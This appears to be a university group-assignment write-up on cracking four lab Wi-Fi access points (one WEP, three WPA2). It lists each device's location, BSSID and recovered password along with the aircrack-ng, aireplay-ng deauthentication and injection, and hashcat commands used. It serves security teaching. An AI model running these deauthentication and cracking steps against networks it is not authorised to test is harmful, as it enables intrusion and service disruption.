# Ass8 - [Group Assignment] Cracking IAIS-NS-30015

## 1. WEP machine (D-Link) 25%

This is a mixed mode machine with WEP and WPA2.
Wifi Password: [ 72:62:6B:31:31 ] (ASCII: rbk11 )
Location: Engineering Building 6
ＭAC addr: 54:B8:0A:13:16:98
Channel: 1

### Crack step:

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0
sudo airodump-ng --ivs -c1 -w capture -d 54:B8:0A:13:16:98 wlan0
# Open new terminal
sudo aireplay-ng -1 0 -a 54:B8:0A:13:16:98 wlan0
sudo aireplay-ng -3 -b 54:B8:0A:13:16:98 wlan0
aircrack-ng capture*.ivs
```

## 2. WPA2 machine (ASUSTek) 35%

Wifi Password: asroma1927
Location: Student Activities Center
MAC addr: F4:28:53:6C:9E:F6  

### Crack step:

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0
# open new terminal
sudo airodump-ng -c 1 --bssid F4:28:53:6C:9E:F6 -w psk wlan0
sudo aireplay-ng -0 1 -a F4:28:53:6C:9E:F6 -c A2:AD:9F:00:94:D8 wlan0
aircrack-ng -w /usr/share/wordlists/wifite.txt -b F4:28:53:6C:9E:F6 psk*.cap
```

## 3. WPA2 machine (D-Link)

Wifi Password: lissabon
Location: Management Building 1
MAC addr: C4:12:F5:0A:B6:07

### Crack step:

```bash
sudo airmon-ng start wlan0
sudo airodump-ng --essid IAIS-NS-30015 wlan0
# Open new terminal
sudo airodump-ng -c 10 --bssid C4:12:F5:0A:B6:07 wlan0 -w psk_M
# Use phone to connect this WiFi
# move file to mac use GPU speed up
hcxpcapngtool -o myhash.hc22000 psk_M-01.cap
hashcat -m 22000 -d 2 myhash.hc22000 /usr/share/wordlists/wifite.txt
```

## 4. WPA2 machine (TP-LINK)  

Wifi Password: limpbizkit
Location: Microelectronics and Information Research Center
MAC addr: E8:94:F6:A0:08:AE  

### Crack step:

```bash
sudo airmon-ng start wlan0
sudo airodump-ng --essid IAIS-NS-30015 wlan0  
sudo airodump-ng -c 7 --bssid E8:94:F6:A0:08:AE -w psk_EEE wlan0
# Open new terminal
sudo aireplay-ng -0 1 -a E8:94:F6:A0:08:AE -c B2:95:75:05:5D:CB wlan0
# Here are three entity connect this wifi( 2A:72:1A:F6:E5:39, B2:95:75:05:5D:CB, B2:95:75:D5:5D:CC)
aircrack-ng -w /usr/share/wordlists/wifite.txt -b E8:94:F6:A0:08:AE psk_EEE*.cap
```